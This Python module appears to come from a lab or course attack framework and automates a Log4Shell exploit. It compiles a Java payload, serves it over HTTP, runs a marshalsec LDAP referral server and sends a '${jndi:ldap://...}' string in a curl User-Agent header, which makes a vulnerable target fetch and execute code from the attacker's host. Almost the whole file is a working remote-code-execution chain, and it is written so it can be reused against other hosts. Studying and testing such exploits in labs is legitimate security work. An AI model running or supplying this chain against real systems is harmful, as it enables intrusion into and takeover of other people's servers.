import os
import subprocess
import time
from ..commands import Command


def compile_java(file_name: str):
    """Compile the Java exploit file into a .class file."""
    try:
        subprocess.run(["javac", file_name], check=True)
        print(f"Compiled {file_name} successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to compile {file_name}: {e}")
        return False
    return True


def start_http_server(port: int, serve_dir: str):
    """Start a Python HTTP server to serve the compiled class file."""
    try:
        print(f"Starting HTTP server")
        subprocess.Popen(
            ["python3", "-m", "http.server", str(port)],
            cwd=serve_dir,
            # stdout=subprocess.DEVNULL,
            # stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        return True
    except Exception as e:
        print(f"Failed to start HTTP server: {e}")
        return False


def start_ldap_server(marshalsec_jar: str, http_url: str):
    """Start the LDAP server to point to the malicious class file."""
    try:
        print(f"Starting LDAP")
        subprocess.Popen(
            ["java", "-cp", marshalsec_jar, "marshalsec.jndi.LDAPRefServer", http_url],
            # stdout=subprocess.DEVNULL,
            # stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        return True
    except Exception as e:
        print(f"Failed to start LDAP server: {e}")
        return False


def trigger_exploit(target_url: str, ldap_url: str):
    """Send the JNDI payload to the vulnerable target."""
    payload = "${jndi:" + ldap_url + "}"
    print(payload)
    
    try:
        print(f"Sending payload")
        subprocess.run(["curl", "-A", payload, target_url], check=True)
        print("Payload sent")
    except subprocess.CalledProcessError as e:
        print("didn't trigger")


class Log4Shell(Command):
    def do_command(self, lines: str, *args):
        """
        Parse the input command and execute the Log4Shell exploit.
        """
        args = lines.split()
        
        # Arguments
        java_file = "/home/e1-attack/final-project-sand/client/cybersploit_client/log4shell/Exploit.java"
        target_url = "http://e1-target.local:8080"
        host_ip = "e1-attack.local"       

        serve_dir = "cybersploit_client/log4shell/"       
        http_port = args[0]  
        marshalsec_jar = "/home/e1-attack/final-project-sand/client/cybersploit_client/log4shell/marshalsec-0.0.3-SNAPSHOT-all.jar"

        # Copy server.py
        subprocess.run(["cp", "/home/e1-attack/final-project-sand/payload/server.py", "/home/e1-attack/final-project-sand/client/cybersploit_client/log4shell/server.py"], check=True)

        # Compile the Java payload
        if not compile_java(java_file):
            return

        # Start HTTP server
        if not start_http_server(http_port, serve_dir):
            return

        # Start LDAP server
        http_url = f"http://{host_ip}:{http_port}/#Exploit"
        if not start_ldap_server(marshalsec_jar, http_url):
            return

        # Trigger the exploit
        ldap_url = f"ldap://{host_ip}:1389/a"
        trigger_exploit(target_url, ldap_url)


# Assign the command to be used in the framework
command = Log4Shell